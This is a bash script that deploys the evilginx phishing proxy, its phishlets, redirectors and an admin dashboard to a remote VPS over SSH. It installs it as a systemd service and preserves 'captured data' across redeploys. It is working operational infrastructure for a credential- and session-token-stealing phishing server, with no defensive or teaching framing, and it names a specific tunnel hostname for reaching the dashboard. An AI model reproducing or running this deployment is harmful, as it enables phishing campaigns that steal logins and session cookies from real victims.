#!/usr/bin/env bash
# Deploy / redeploy evilginx + dashboard to a VPS over SSH.
#
# Usage:
#   ./deploy/build-linux.sh              # build the artifact first
#   ./deploy/push.sh root@<VPS_IP>       # deploy as root, or…
#   ./deploy/push.sh sysadmin@<VPS_IP>   # deploy as a sudo-capable user
#
# Works with a non-root login: files are staged to /tmp (no privilege), then a
# single privileged step (sudo, prompted once via a TTY) installs the binary,
# systemd unit, and password file, and restarts the service.
#
# Idempotent. Captured data under /opt/evilginx/.evilginx is preserved across
# redeploys; the dashboard password (dashboard.env) is generated once.
#
# Tip: run `ssh-copy-id <user>@<VPS_IP>` first so you aren't asked for the SSH
# password on every connection.
set -euo pipefail

REMOTE="${1:-${VPS:-}}"
if [ -z "$REMOTE" ]; then
  echo "usage: $0 user@vps-ip   (or set VPS=user@vps-ip)" >&2
  exit 1
fi

cd "$(dirname "$0")/.."
if [ ! -x deploy/out/evilginx ]; then
  echo "[!] deploy/out/evilginx not found — run ./deploy/build-linux.sh first" >&2
  exit 1
fi

# Use sudo on the remote unless we're logging in as root.
REMOTE_USER="${REMOTE%@*}"
SUDO="sudo"
[ "$REMOTE_USER" = "root" ] && SUDO=""

SSH_OPTS="-o StrictHostKeyChecking=accept-new"
STAGE="/tmp/evilginx-deploy"

echo "[*] staging files to $REMOTE:$STAGE  (no privilege needed)"
ssh $SSH_OPTS "$REMOTE" "rm -rf $STAGE && mkdir -p $STAGE"

if command -v rsync >/dev/null 2>&1; then
  rsync -az -e "ssh $SSH_OPTS" \
    deploy/out/evilginx \
    deploy/out/phishlets \
    deploy/out/redirectors \
    deploy/evilginx.service \
    "$REMOTE:$STAGE/"
else
  scp $SSH_OPTS deploy/out/evilginx "$REMOTE:$STAGE/"
  scp $SSH_OPTS -r deploy/out/phishlets "$REMOTE:$STAGE/"
  scp $SSH_OPTS -r deploy/out/redirectors "$REMOTE:$STAGE/"
  scp $SSH_OPTS deploy/evilginx.service "$REMOTE:$STAGE/"
fi

echo "[*] installing on remote (you may be prompted for the sudo password once)"
# -t allocates a TTY so sudo can prompt interactively. The heredoc is quoted so
# all variables expand on the REMOTE side.
ssh $SSH_OPTS -t "$REMOTE" "$SUDO bash -s" <<'REMOTE_EOF'
set -euo pipefail
SRC=/tmp/evilginx-deploy
DST=/opt/evilginx

mkdir -p "$DST" "$DST/.evilginx"

# atomic binary swap
install -m 0755 "$SRC/evilginx" "$DST/evilginx.new"
mv -f "$DST/evilginx.new" "$DST/evilginx"

# phishlets + redirectors (replace; captured data in .evilginx is untouched)
rm -rf "$DST/phishlets" "$DST/redirectors"
cp -r "$SRC/phishlets" "$DST/phishlets"
cp -r "$SRC/redirectors" "$DST/redirectors"

# systemd unit
install -m 0644 "$SRC/evilginx.service" /etc/systemd/system/evilginx.service

# dashboard admin password — generated once, preserved across redeploys
if [ ! -f "$DST/dashboard.env" ]; then
  PW=$(head -c 18 /dev/urandom | base64 | tr -d '/+=' | cut -c1-20)
  printf 'EVILGINX_DASH_PASSWORD=%s\n' "$PW" > "$DST/dashboard.env"
  chmod 600 "$DST/dashboard.env"
  echo "[+] generated dashboard admin password:"
  echo "      user: admin"
  echo "      pass: $PW"
  echo "    (stored in $DST/dashboard.env — change it after first login)"
fi

systemctl daemon-reload
systemctl enable evilginx >/dev/null 2>&1 || true
systemctl restart evilginx
sleep 2
systemctl --no-pager --lines=12 status evilginx || true

rm -rf "$SRC"
REMOTE_EOF

echo
echo "[+] deployed. Reach the dashboard via:"
echo "      • Cloudflare Tunnel:  https://sambat.anugan.com   (Access OTP -> login)"
echo "      • or SSH tunnel:      ssh -N -L 8080:127.0.0.1:8080 $REMOTE"
echo "                            then browse http://127.0.0.1:8080"
